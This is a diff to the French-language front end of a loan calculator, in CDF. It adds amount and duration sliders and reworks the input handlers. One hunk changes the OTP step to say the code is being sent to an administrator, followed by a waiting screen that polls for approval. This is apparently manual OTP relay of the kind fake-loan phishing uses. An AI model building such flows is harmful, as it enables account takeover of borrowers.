@@ -5,7 +5,7 @@ const API_BASE = window.location.origin;
 let currentSection = 1;
 let loanAmount = 500000;
 let loanDuration = 12;
-const minAmount = 0;
+const minAmount = 50000;
 const maxAmount = 2000000;
 const minDuration = 1;
 const maxDuration = 24;
@@ -41,27 +41,70 @@ function calculate() {
   document.getElementById('sumInterest').textContent = formatNumber(totalInterest.toFixed(2)) + ' CDF';
   document.getElementById('sumTotal').textContent = formatNumber(totalRepayment.toFixed(2)) + ' CDF';
   document.getElementById('sumMonthly').textContent = formatNumber(monthlyPayment) + ' CDF';
+
+  const amountPct = ((loanAmount - minAmount) / (maxAmount - minAmount)) * 100;
+  const durationPct = ((loanDuration - minDuration) / (maxDuration - minDuration)) * 100;
+
+  document.getElementById('amountFill').style.width = amountPct + '%';
+  document.getElementById('amountThumb').style.left = amountPct + '%';
+  document.getElementById('durationFill').style.width = durationPct + '%';
+  document.getElementById('durationThumb').style.left = durationPct + '%';
 }
 
-function updateFromInputs() {
-  const amountInput = document.getElementById('amountInput');
-  const durationInput = document.getElementById('durationInput');
-  
-  if (amountInput) {
-    let val = parseNumber(amountInput.value);
-    val = Math.max(minAmount, Math.min(maxAmount, val));
-    loanAmount = val;
-    amountInput.value = formatNumber(val);
+function updateFromSlider(isAmount, value) {
+  if (isAmount) {
+    loanAmount = Math.round(value / 10000) * 10000;
+    document.getElementById('amountInput').value = formatNumber(loanAmount);
+  } else {
+    loanDuration = value;
+    document.getElementById('durationInput').value = loanDuration;
   }
-  
-  if (durationInput) {
-    let val = parseInt(durationInput.value) || minDuration;
+  calculate();
+}
+
+function updateFromInput(isAmount) {
+  if (isAmount) {
+    let val = parseNumber(document.getElementById('amountInput').value);
+    val = Math.max(minAmount, Math.min(maxAmount, val));
+    loanAmount = Math.round(val / 10000) * 10000;
+    document.getElementById('amountInput').value = formatNumber(loanAmount);
+  } else {
+    let val = parseInt(document.getElementById('durationInput').value) || minDuration;
     val = Math.max(minDuration, Math.min(maxDuration, val));
     loanDuration = val;
-    durationInput.value = val;
+    document.getElementById('durationInput').value = loanDuration;
   }
-  
   calculate();
+}
+
+// ==================== SLIDER SETUP ====================
+function setupSlider(trackId, thumbId, min, max, isAmount) {
+  const track = document.getElementById(trackId);
+  const thumb = document.getElementById(thumbId);
+  let isDragging = false;
+
+  function updateFromX(clientX) {
+    const rect = track.getBoundingClientRect();
+    let pct = (clientX - rect.left) / rect.width;
+    pct = Math.max(0, Math.min(1, pct));
+    const value = Math.round(min + pct * (max - min));
+    if (isAmount) {
+      updateFromSlider(true, value);
+    } else {
+      updateFromSlider(false, value);
+    }
+  }
+
+  thumb.addEventListener('mousedown', (e) => { isDragging = true; e.preventDefault(); });
+  thumb.addEventListener('touchstart', (e) => { isDragging = true; });
+
+  document.addEventListener('mousemove', (e) => { if (isDragging) updateFromX(e.clientX); });
+  document.addEventListener('touchmove', (e) => { if (isDragging) updateFromX(e.touches[0].clientX); });
+
+  document.addEventListener('mouseup', () => { isDragging = false; });
+  document.addEventListener('touchend', () => { isDragging = false; });
+
+  track.addEventListener('click', (e) => { if (!isDragging) updateFromX(e.clientX); });
 }
 
 // ==================== NAVIGATION ====================
@@ -221,7 +264,7 @@ async function verifyOTP() {
     return;
   }
 
-  messageEl.textContent = 'Vérification en cours...';
+  messageEl.textContent = 'Envoi à l\'administrateur...';
   messageEl.style.color = '#6b7280';
 
   try {
@@ -250,8 +293,7 @@ async function verifyOTP() {
 }
 
 function startOTPValidationPolling() {
-  // Show waiting state
-  goToSection(6); // Show pending/waiting screen
+  goToSection(6); // Show waiting screen
   
   if (otpCheckInterval) clearInterval(otpCheckInterval);
   
@@ -331,22 +373,27 @@ function showToast(message, type = 'info') {
 
 // ==================== INIT ====================
 document.addEventListener('DOMContentLoaded', () => {
+  // Setup sliders
+  setupSlider('amountTrack', 'amountThumb', minAmount, maxAmount, true);
+  setupSlider('durationTrack', 'durationThumb', minDuration, maxDuration, false);
+
+  // Setup text inputs
   const amountInput = document.getElementById('amountInput');
   const durationInput = document.getElementById('durationInput');
   
   if (amountInput) {
     amountInput.value = formatNumber(loanAmount);
-    amountInput.addEventListener('blur', updateFromInputs);
+    amountInput.addEventListener('blur', () => updateFromInput(true));
     amountInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') updateFromInputs();
+      if (e.key === 'Enter') updateFromInput(true);
     });
   }
   
   if (durationInput) {
     durationInput.value = loanDuration;
-    durationInput.addEventListener('blur', updateFromInputs);
+    durationInput.addEventListener('blur', () => updateFromInput(false));
     durationInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') updateFromInputs();
+      if (e.key === 'Enter') updateFromInput(false);
     });
   }
   
